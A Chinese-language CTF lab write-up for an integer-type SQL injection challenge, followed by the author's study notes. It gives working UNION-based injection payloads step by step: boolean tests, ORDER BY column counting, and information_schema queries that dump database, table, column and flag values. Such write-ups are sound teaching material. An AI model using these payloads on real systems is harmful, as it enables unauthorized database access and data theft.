# CTFHub Writeup - 整数型注入

## 题目类型

WEB

## 题目描述

打开题目，点开链接后

页面出现一个大标题

SQL 整数型注入

标题下方有一个输入框，左边有ID这一字，右边有一个绿色的Search按鍵

输入框中有一句话：

输个1试试？

## 解题过程

按照输入框的意思，我先输入了个1，页面回显了数据。

这说明后端代码大概是 select * from news where id=1。它把我的输入直接拼进去了。

我故意输入 1 and 1=2

发现页面没有数据了，证明漏洞存在

然后依次输入 1 order by 2、1 order by 3来判断字段数

页面回显：
	• order by 2：正常回显（说明表至少有2列）
	• order by 3：报错或无数据（说明表只有2列）

在搜索框中输入 -1 union select 1,2为寻找黄金回显点

页面回显：ID: 1，Data: 2

这样就找到页面的“广告位”，把不显示数据的位置换成我们要查的东西

最后一步进行联合查询脱库，进而拿到数据：

1. 查库名
   
• 输入：-1 union select 1,database()

• 回显：Data: sqli

• 原理：database() 是内置函数，直接告诉你当前库叫 sqli。 

2. 查表名
   
• 输入：-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()

• 回显：Data: flag,news

• 原理：去 tables 表（户口本）里查 sqli 库下有哪些表。group_concat() 把多行表名拼成一行显示。看到目标表 flag。 
3. 查字段名（列名）

• 输入：-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'

• 回显：Data: flag

• 原理：去 columns 表里查 flag 表里有哪些列。发现列名就叫 flag。 
4. 拿数据

• 输入：-1 union select 1,flag from flag

• 回显：Data: 正确的Flag

• 原理：直接在 flag 表里查出 flag 列的值

## 笔记

这道题主要学习了：

1. 整数型注入的判定：学会了如何用 and 1=1 和 and 1=2 来判断参数是否未过滤、且无引号包裹。
   
2. UNION 联合查询注入（联合注入）：这是最经典、最直观的注入方式。你学会了：
	
  • 用 order by 测列数。
  
	• 用 -1 占位，让联合查询的结果（union select 1,2）成功在页面回显。
3. MySQL 脱库三件套：
   
	• 查库：database()

	• 查表：information_schema.tables + group_concat(table_name)

	• 查字段：information_schema.columns + group_concat(column_name)

4. 核心函数的使用：认识了 database()、group_concat()、information_schema 系统库的作用。
